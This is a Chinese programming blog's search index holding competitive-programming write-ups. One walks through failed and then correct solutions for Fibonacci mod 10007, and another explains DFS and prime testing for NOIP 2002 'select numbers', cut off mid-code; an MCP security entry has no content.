<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>模型上下文协议-MCP的安全挑战学习及抛砖引玉</title>
    <link href="/2025/05/17/%E6%A8%A1%E5%9E%8B%E4%B8%8A%E4%B8%8B%E6%96%87%E5%8D%8F%E8%AE%AE-MCP%E7%9A%84%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%8A%9B%E7%A0%96%E5%BC%95%E7%8E%89/"/>
    <url>/2025/05/17/%E6%A8%A1%E5%9E%8B%E4%B8%8A%E4%B8%8B%E6%96%87%E5%8D%8F%E8%AE%AE-MCP%E7%9A%84%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%8A%9B%E7%A0%96%E5%BC%95%E7%8E%89/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>记一次与Fibonacci斗智斗勇</title>
    <link href="/2025/05/17/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8EFibonacci%E6%96%97%E6%99%BA%E6%96%97%E5%8B%87/"/>
    <url>/2025/05/17/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8EFibonacci%E6%96%97%E6%99%BA%E6%96%97%E5%8B%87/</url>
    
    <content type="html"><![CDATA[<h1>记一次与Fibonacci斗智斗勇</h1><h2 id="楔子：">楔子：</h2><p>事必有因。近时方备战粤港澳信息学竞赛，适值主办方有其平台，故欲以其平台练题。然用之颇觉不堪，譬如一题所予提示甚少，题目分类未明，且大多无题解。此题吾亦屡试方解出，遂作此文，以便后学及自我温习。</p><p>那首先来看看这题目和出题人究竟时何方神圣</p><h2 id="题目描述：">题目描述：</h2><h3 id="LQ1005-入门训练Fibonacci数列">LQ1005:入门训练Fibonacci数列</h3><p>知识点:简单递归 C+±运算符和表达式概念</p><p>Fibonacci数列的递推公式为:Fn=Fn-1+Fn-2,其中F1=F2=1。<br>当n比较大时,Fn也非常大,现在我们想知道,Fn除以10007的余数是多少。</p><h4 id="输入格式">输入格式</h4><p><strong>输入描述:</strong><br>输入包含一个整数<code>n</code>。<br>输入样例:</p><div class="code-wrapper"><pre><code class="hljs">10</code></pre></div><h4 id="输出格式">输出格式</h4><p><strong>输出描述:</strong><br>输出一行,包含一个整数,表示<code>Fn</code>除以10007的余数。</p><p>说明:在本题中,答案是要求<code>Fn</code>除以10007的余数,因此我们只要能算出这个余数即可,<u>而不需要先计算出<code>Fn</code>的准确值,再将计算的结果除以10007取余</u> （记住这里后面要考）<br>数,直接计算余数往往比先算出原数再取余简单。<br>输出样例:</p><div class="code-wrapper"><pre><code class="hljs">55</code></pre></div><p>【提升】<br>HINT:时间限制:1.0s 内存限制:256.0MB<br>1≤n ≤ 1,000,000.</p><h2 id="分析">分析</h2><h3 id="初步分析">初步分析</h3><p>我们从题目中可以得知，这道题要求我们实现以下两个部分</p><ul><li>先实现求出斐波那契数列</li><li>再用所求出的数进行模10007后输出值</li></ul><p>那这样的话，我们的思路一般都是<s>一眼丁真</s> 一眼递归，那么我们可以写出如下代码：</p><div class="code-wrapper"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Fib</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;    <span class="hljs-keyword">if</span>(n == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    <span class="hljs-keyword">if</span>(n == <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-built_in">Fib</span>(n<span class="hljs-number">-1</span>)+<span class="hljs-built_in">Fib</span>(n<span class="hljs-number">-2</span>);&#125;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-type">int</span> n;    cin &gt;&gt; n;    cout &lt;&lt; <span class="hljs-built_in">Fib</span>(n) &lt;&lt; endl;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>之后我们对其进行补充，加上让它模掉<code>10007</code>就可以了，prefect~</p><p>like this（在这里水一波字数）</p><div class="code-wrapper"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Fib</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;    <span class="hljs-keyword">if</span>(n == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    <span class="hljs-keyword">if</span>(n == <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-built_in">Fib</span>(n<span class="hljs-number">-1</span>)+<span class="hljs-built_in">Fib</span>(n<span class="hljs-number">-2</span>);&#125;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-type">int</span> n;    cin &gt;&gt; n;    <span class="hljs-type">int</span> ans = <span class="hljs-built_in">Fib</span>(n)%<span class="hljs-number">10007</span>;    cout &lt;&lt; ans &lt;&lt; endl;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>根据我们的值这道题没有问题，不用2分钟就AC了，然而事情真就如此吗？</p><p>恰恰相反 实则不然 人之常情(bushi)</p><p>当我把题解放上去满心憧憬的时候</p><p>爆零了</p><p>！？</p><h2 id="解剖开始">解剖开始</h2><p>我们重新回到题目描述中，可以看到它的数据范围为1≤n ≤ 1,000,000，那如果我们直接输入1,000,000那就会。。。</p><div class="code-wrapper"><pre><code class="hljs zsh">➜  p1706 git:(master) ✗ ./a.out1000000[1]    59990 segmentation fault (core dumped)  ./a.out</code></pre></div><p>就会趋势</p><p>那既然超出了数值范围，那我们改成longlong试试</p><p>我们只得了300分。。。</p><p>也就是说我们是没有完全AC的，看了扣分点提示我们TLE了，根据目前的代码想想是哪里出了问题呢？</p><div class="code-wrapper"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-type">int</span> n;    cin &gt;&gt; n;    <span class="hljs-type">long</span> <span class="hljs-type">long</span> a = <span class="hljs-number">1</span>, b = <span class="hljs-number">1</span>, c;      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">3</span>; i &lt;= n; i++) &#123;        c = a + b;         a = b;        b = c;    &#125;    cout &lt;&lt; b % <span class="hljs-number">10007</span> &lt;&lt; endl;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>输出内容是这样的</p><div class="code-wrapper"><pre><code class="hljs zsh">➜  p1706 git:(master) ✗ ./a.out     1000000-1044</code></pre></div><p>我们能明显的意识到它发生整数溢出了，是计算机中整数存储的典型表现：当数值超过数据类型能表示的最大正值时，会&quot;环绕&quot;到负值范围。但是明明我们都用上了<code>long long</code>了，但是为什么还发生了溢出？</p><p>那我们加大剂量</p><div class="code-wrapper"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<span class="hljs-type">const</span> <span class="hljs-type">int</span> MOD = <span class="hljs-number">1e9</span> <span class="hljs-number">+7</span>; <span class="hljs-comment">// 防止数值溢出</span><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Matrix</span> &#123;    <span class="hljs-type">long</span> <span class="hljs-type">long</span> mat[<span class="hljs-number">2</span>][<span class="hljs-number">2</span>];    <span class="hljs-built_in">Matrix</span>() &#123; mat[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]=mat[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]=mat[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>; mat[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]=<span class="hljs-number">0</span>; &#125;&#125;;<span class="hljs-function">Matrix <span class="hljs-title">multiply</span><span class="hljs-params">(<span class="hljs-type">const</span> Matrix&amp; a, <span class="hljs-type">const</span> Matrix&amp; b)</span> </span>&#123;    Matrix res;    res.mat[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = (a.mat[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]*b.mat[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] + a.mat[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]*b.mat[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]) % MOD;    res.mat[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = (a.mat[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]*b.mat[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] + a.mat[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]*b.mat[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]) % MOD;    res.mat[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = (a.mat[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]*b.mat[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] + a.mat[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]*b.mat[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]) % MOD;    res.mat[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = (a.mat[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]*b.mat[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] + a.mat[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]*b.mat[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]) % MOD;    <span class="hljs-keyword">return</span> res;&#125;<span class="hljs-function">Matrix <span class="hljs-title">matrix_pow</span><span class="hljs-params">(Matrix a, <span class="hljs-type">int</span> n)</span> </span>&#123;    Matrix res;    res.mat[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = res.mat[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>; <span class="hljs-comment">// 初始化为单位矩阵</span>    res.mat[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = res.mat[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;        <span class="hljs-keyword">while</span>(n &gt; <span class="hljs-number">0</span>) &#123;        <span class="hljs-keyword">if</span>(n &amp; <span class="hljs-number">1</span>) res = <span class="hljs-built_in">multiply</span>(res, a);        a = <span class="hljs-built_in">multiply</span>(a, a);        n &gt;&gt;= <span class="hljs-number">1</span>;    &#125;    <span class="hljs-keyword">return</span> res;&#125;<span class="hljs-function"><span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-title">fib</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;    <span class="hljs-keyword">if</span>(n == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    Matrix m;    m = <span class="hljs-built_in">matrix_pow</span>(m, n<span class="hljs-number">-1</span>);    <span class="hljs-keyword">return</span> m.mat[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];&#125;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-type">int</span> n;    cin &gt;&gt; n;    cout &lt;&lt; <span class="hljs-built_in">fib</span>(n)%<span class="hljs-number">10007</span> &lt;&lt; endl;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>然后还是300分，原因。。。<code> 0Wrong AnswerRead 3057, expect 2091.</code></p><p>那我们再改改</p><div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<span class="hljs-function"><span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-title">fib</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;    <span class="hljs-keyword">if</span> (n == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    <span class="hljs-type">long</span> <span class="hljs-type">long</span> a = <span class="hljs-number">0</span>, b = <span class="hljs-number">1</span>, c;    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= n; i++) &#123;        c = a + b;        a = b;        b = c;    &#125;    <span class="hljs-keyword">return</span> b;&#125;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-type">int</span> n;    cin &gt;&gt; n;    <span class="hljs-type">int</span> ans = <span class="hljs-built_in">fib</span>(n)%<span class="hljs-number">10007</span>;    cout &lt;&lt; ans &lt;&lt; endl;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>好了，这次多了100分，看一眼报错<code>0Wrong Answer Read 4432, expect 6545.</code></p><h2 id="再看看题目描述呢？">再看看题目描述呢？</h2><h3 id="摘要">摘要</h3><p><strong>输出描述:</strong><br>输出一行,包含一个整数,表示<code>Fn</code>除以10007的余数。</p><p><u>说明:在本题中,答案是要求<code>Fn</code>除以10007的余数,因此我们只要能算出这个余数即可,而不需要先计算出<code>Fn</code>的准确值,再将计算的结果除以10007取余数,直接计算余数往往比先算出原数再取余简单。</u></p><p>在根据我们前面的尝试，得出这道题的AK思路应该是：</p><ol><li>使用迭代而非递归（O(n)时间）</li><li>每次加法后立即取模（防止溢出）</li></ol><p><strong>《每次加法后立即取模》</strong></p><p>也就是说一开始我们的分析中就错了一步，斐波那契数列增长速度极快，也就是说无论我们如何去补救，如果始终采取先求数再取模的话就会导致TLE！</p><p>所以真正的思路是这样的：</p><ol><li><strong>递归方法的问题</strong>：直接使用递归计算Fibonacci数列会导致指数级的时间复杂度（O(2^n)），当n较大时（如n=50），甚至不需要等到1000000就会使计算非常缓慢甚至栈溢出。</li><li><strong>迭代方法</strong>：使用循环从F1和F2逐步计算到Fn，时间复杂度为O(n)，适用于较大的n值。</li><li><strong>模运算性质</strong>：由于我们只需要结果对10007的余数，可以在每一步计算时都对10007取模，利用模运算的性质（(a + b) mod m = (a mod m + b mod m) mod m）防止数值溢出。</li></ol><p>那既然思路清楚了，我们可以给出真正的AC代码了！</p><div class="code-wrapper"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">fibMod</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;    <span class="hljs-type">const</span> <span class="hljs-type">int</span> MOD = <span class="hljs-number">10007</span>;    <span class="hljs-keyword">if</span> (n == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    <span class="hljs-keyword">if</span> (n == <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;        <span class="hljs-type">int</span> a = <span class="hljs-number">0</span>, b = <span class="hljs-number">1</span>, c;    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= n; ++i) &#123;        c = (a + b) % MOD;  <span class="hljs-comment">// 每一步计算都取模防止溢出</span>        a = b;        b = c;    &#125;    <span class="hljs-keyword">return</span> b;&#125;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-type">int</span> n;    cin &gt;&gt; n;    cout &lt;&lt; <span class="hljs-built_in">fibMod</span>(n)%<span class="hljs-number">10007</span> &lt;&lt; endl;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><h2 id="总结">总结</h2><ul><li>看清数据范围</li><li>用迭代而不是递归</li><li>无需求出对应数而是每一步都进行取模</li><li>有一颗宁静的心</li></ul><script src="https://giscus.app/client.js" data-repo="solkatt-cn/solkatt-cn.github.io" data-repo-id="R_kgDONzaTTQ" data-category="Announcements" data-category-id="DIC_kwDONzaTTc4Cpqn7" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>由一道题引发对DFS的思考</title>
    <link href="/2025/05/17/NOIP-2002-%E6%99%AE%E5%8F%8A%E7%BB%84-%E9%80%89%E6%95%B0/"/>
    <url>/2025/05/17/NOIP-2002-%E6%99%AE%E5%8F%8A%E7%BB%84-%E9%80%89%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="NOIP-2002-普及组-选数">[NOIP 2002 普及组] 选数</h2><p>感觉过于标题的意思了，其实是由这道题来引出深度优先搜索(DFS)</p><h2 id="首先看看题目描述：">首先看看题目描述：</h2><h3 id="题目描述">题目描述</h3><p>已知 $\large n$ 个整数 $x_1,x_2,\cdots,x_n$，以及$1$个整数$k$($k&lt;n$)。从$n$ 个整数中任选 $k$个整数相加，可分别得到一系列的和。例如当$n=4$，$k=3$，$4$ 个整数分别为 $3,7,12,19$ 时，可得全部的组合与它们的和为：</p><p>$3+7+12=22$</p><p>$3+7+19=29$</p><p>$7+12+19=38$</p><p>$3+12+19=34$</p><p>现在，要求你计算出和为素数共有多少种。</p><p>例如上例，只有一种的和为素数：$3+7+19=29$。</p><h3 id="输入格式">输入格式</h3><p>第一行两个空格隔开的整数 $n,k$（$1 \le n \le 20$，$k&lt;n$）。</p><p>第二行 $n$ 个整数，分别为 $x_1,x_2,\cdots,x_n$（$1 \le x_i \le 5\times 10^6$）。</p><h3 id="输出格式">输出格式</h3><p>输出一个整数，表示种类数。</p><h3 id="输入输出样例-1">输入输出样例 #1</h3><h4 id="输入-1">输入 #1</h4><div class="code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">4 </span><span class="hljs-number">3</span><span class="hljs-symbol">3 </span><span class="hljs-number">7</span> <span class="hljs-number">12</span> <span class="hljs-number">19</span></code></pre></div><h4 id="输出-1">输出 #1</h4><div class="code-wrapper"><pre><code class="hljs">1</code></pre></div><h3 id="说明-提示">说明/提示</h3><p><strong>【题目来源】</strong></p><p>NOIP 2002 普及组第二题</p><hr><h2 id="具体分析：">具体分析：</h2><p>主要：是从给定的 <em>n</em> 个整数中任选 <em>k</em> 个整数进行相加，然后统计这些和中为素数的组合的数量。</p><h3 id="输入输出分析">输入输出分析</h3><ul><li><p><strong>输入</strong></p><ul><li>第一行包含两个用空格隔开的整数 <em>n</em> 和 <em>k</em>，其中 1≤<em>n</em>≤20 且 <em>k</em>&lt;<em>n</em>。<em>n</em> 表示整数的总数，<em>k</em> 表示需要选取的整数个数。</li><li>第二行包含 <em>n</em> 个整数 <em>x</em>1,<em>x</em>2,⋯,<em>x**n</em>，每个整数的范围是 1≤<em>x**i</em>≤5×106。</li></ul></li><li><p><strong>输出</strong></p></li><li><p>输出一个整数，表示和为素数的组合的种类数。</p></li></ul><h3 id="问题求解思路：">问题求解思路：</h3><p>要解决这个问题，主要分为以下两个关键按步骤：</p><ul><li>找出n个整数中选取的k个整数的所有组合并求和</li><li>判断每个组合的和是否是素数</li></ul><ol><li><h4 id="组合选取">组合选取</h4><p>对于n的范围较小 (1≤<em>n</em>≤20)，我们可以使用深度优先搜索算法来枚举所有可能的组合。在此笔者阐述以下什么是深度优先搜素(DFS)算法</p><h6 id="tips-佬们如果已经了解相关内容可用右侧的那个什么栏进行跳过">tips: 佬们如果已经了解相关内容可用右侧的那个什么栏进行跳过</h6><p>深度优先搜索是一种通过递归的方式遍历所有可能状态或搜索树/图的算法，非常适合解决组合问题，其核心思想是 <strong>尽可能深地探索当前路径，直到无法继续前进时才回溯</strong>。深度优先搜索具有以下三个特点：</p><ul><li>递归实现：纯天然适合递归（函数调用栈自动处理回溯）</li><li>回溯机制：当一条路走到尽头时，返回上一个分叉点</li><li>时间复杂度：通常为$O(b**d)$ ，b 是分支因子，d是最大深度</li></ul><p><em><strong>结合例题：在全排列问题中的应用</strong></em><br><a href="https://www.luogu.com.cn/problem/P1706">P1706 全排列问题</a></p></li></ol><ul><li><p><strong>问题分析</strong></p><ul><li>目标：生成1到n的所有排列（共n!种）</li><li>关键约束：每个字只能使用一次</li><li>输出要求：按字典顺序排列</li></ul></li><li><p><strong>DFS解决思路：</strong></p><p>(1) <strong>状态标识</strong>：</p><ul><li>当前已选择的数字序列<code>path</code></li><li>记录数字是否已经使用的数字<code>used</code>(从而避免重复)</li></ul><p>(2) <strong>递归过程</strong>：</p><ul><li>终止条件：<code>path</code>长度等于<code>n</code>时输出结果</li><li>遍历选择：对于每个未使用的数字加入数组<code>path</code>并递归</li><li>回溯：走到尽头后返回上一个分叉点然后尝试新选择</li></ul></li></ul><p>以下是我的代码实现，但是写了太垃圾用AI优化了以下</p><div class="code-wrapper"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><span class="hljs-type">int</span> used[<span class="hljs-number">15</span>];      <span class="hljs-comment">// 标记数字是否使用过</span><span class="hljs-type">int</span> perm[<span class="hljs-number">15</span>];      <span class="hljs-comment">// 当前排列</span><span class="hljs-type">int</span> n;<span class="hljs-comment">// 打印当前排列</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print_perm</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; ++i) &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%5d&quot;</span>, perm[i]); <span class="hljs-comment">// 保持5字符场宽</span>    &#125;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);&#125;<span class="hljs-comment">// 深度优先搜索生成排列</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> depth)</span> </span>&#123; <span class="hljs-comment">// depth表示当前处理的位置</span>    <span class="hljs-keyword">if</span> (depth &gt; n) &#123;  <span class="hljs-comment">// 已生成完整排列</span>        <span class="hljs-built_in">print_perm</span>();        <span class="hljs-keyword">return</span>;    &#125;        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num = <span class="hljs-number">1</span>; num &lt;= n; ++num) &#123; <span class="hljs-comment">// 尝试每个数字</span>        <span class="hljs-keyword">if</span> (!used[num]) &#123;                <span class="hljs-comment">// 如果该数字未使用</span>            used[num] = <span class="hljs-number">1</span>;               <span class="hljs-comment">// 标记使用</span>            perm[depth] = num;           <span class="hljs-comment">// 放入当前位置</span>            <span class="hljs-built_in">dfs</span>(depth + <span class="hljs-number">1</span>);              <span class="hljs-comment">// 递归处理下一位置</span>            used[num] = <span class="hljs-number">0</span>;               <span class="hljs-comment">// 回溯，取消标记</span>        &#125;    &#125;&#125;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;n);    <span class="hljs-built_in">dfs</span>(<span class="hljs-number">1</span>); <span class="hljs-comment">// 从第1个位置开始生成</span>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p><strong>这里我给出一个DFS执行流程图（以n=3为例）</strong></p><pre><code class=" mermaid">graph TD    A[开始] --&gt; B[选择1]    B --&gt; C[选择2]    C --&gt; D[选择3] --&gt; E[输出1,2,3]    D --&gt; F[回溯到选择2]    C --&gt; G[选择3] --&gt; H[输出1,3,2]    G --&gt; I[回溯到选择1]    B --&gt; J[选择2]    J --&gt; K[选择1] --&gt; L[输出2,1,3]    K --&gt; M[回溯到选择2]    J --&gt; N[选择3] --&gt; O[输出2,3,1]    N --&gt; P[回溯到开始]    A --&gt; Q[选择3]    Q --&gt; R[选择1] --&gt; S[输出3,1,2]    R --&gt; T[回溯到选择3]    Q --&gt; U[选择2] --&gt; V[输出3,2,1]</code></pre><p><strong>然后对其复杂度进行分析</strong></p><ul><li><p>时间复杂度：$O(b**d)$</p><p>(共有n!种排列方案，每种排列生成都需要花费O(n)的时间)</p></li><li><p>同时我们又引入了<strong>空间复杂度</strong>的概念：O(n) =&gt; 递归栈最大深度为n</p></li></ul><hr><ol start="2"><li><h4 id="素数判断">素数判断</h4></li></ol><p>了解了DFS之后，现在我们就来思考如何去处理素数判断逻辑，根据我几乎忘得差不多的小学数学来看，素数是指大于1且只能被1和自生整除的正整数，因此要设计判断一个数是否为素数，我们可以从2开始到 <strong>$\sqrt[2]{n}$</strong> 进行遍历，如果该数字能被其中任何一个整除，则这个数不是素数，反之同理</p><h2 id="代码实现思路">代码实现思路</h2><p>根据上文我们得知，代码主要有三个部分组成：素数判断函数、深度优先搜索函数和主函数组成</p><h4 id="各部分代码实现与解读">各部分代码实现与解读</h4><ol><li><p><strong>素数判断函数</strong></p><ul><li>首先，我们需要判断接受的数字n是否小于2，如果小于2就直接<code>false</code>（因为我们是从2遍历到 $\sqrt[2]{n}$ ）且定义上其大小要求大于1</li><li>其次从2开始到$\sqrt[2]{n}$进行遍历，如果<code>n</code>能被其中任意一个整数整除，则返回<code>false</code>表示该数不是素数</li><li>如果遍历完都没有找到能整除 <code>n</code> 的数，则返回 <code>true</code>，表示是素数。</li></ul><p>实现代码</p><div class="code-wrapper"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isPrime</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123; <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">2</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= <span class="hljs-built_in">sqrt</span>(n); i++) &#123;     <span class="hljs-keyword">if</span> (n % i == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; &#125; <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;</code></pre></div></li><li><p><strong>深度优先搜索函数<code>dfs</code></strong></p><ul><li><code>start</code> 表示当前搜索的起始位置，<code>cnt</code> 表示已经选取的数的个数，<code>sum</code> 表示当前选取的数的和。</li><li>当 <code>cnt</code> 等于 <em>k</em> 时，说明已经选取了 <em>k</em> 个数，此时调用 <code>isPrime</code> 函数判断 <code>sum</code> 是否为素数，如果是则将结果 <code>ans</code> 加 1。</li><li>从 <code>start</code> 开始遍历数组，递归调用 <code>dfs</code> 函数，更新 <code>start</code> 为 <code>i + 1</code>，<code>cnt</code> 为 <code>cnt + 1</code>，<code>sum</code> 为 <code>sum + nums[i]</code>，以继续选取下一个数。</li></ul></li></ol><p>实现代码</p><div class="code-wrapper"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> start, <span class="hljs-type">int</span> cnt, <span class="hljs-type">int</span> sum)</span> </span>&#123;    <span class="hljs-keyword">if</span> (cnt == k) &#123;        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isPrime</span>(sum)) &#123;            ans++;        &#125;        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = start; i &lt; n; i++) &#123;        <span class="hljs-built_in">dfs</span>(i + <span class="hljs-number">1</span>, cnt + <span class="hljs-number">1</span>, sum + nums[i]);    &#125;&#125;</code></pre></div><ol start="3"><li><strong>主函数<code>main</code></strong><ul><li>首先读取输入的<code>k</code>和<code>n</code>，以及<code>n</code>个整数</li><li>调用<code>dfs</code>函数开始搜索，将<code>start</code>、<code>cnt</code>和<code>sum</code>都初始化为0</li><li>最后输出结果<code>ans</code><br>实现代码</li></ul></li></ol><div class="code-wrapper"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;    cin &gt;&gt; n &gt;&gt; k;    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;        cin &gt;&gt; nums[i];    &#125;    <span class="hljs-built_in">dfs</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);    cout &lt;&lt; ans &lt;&lt; endl;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>综上，以下是汇总后的完整代码</p><div class="code-wrapper"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span 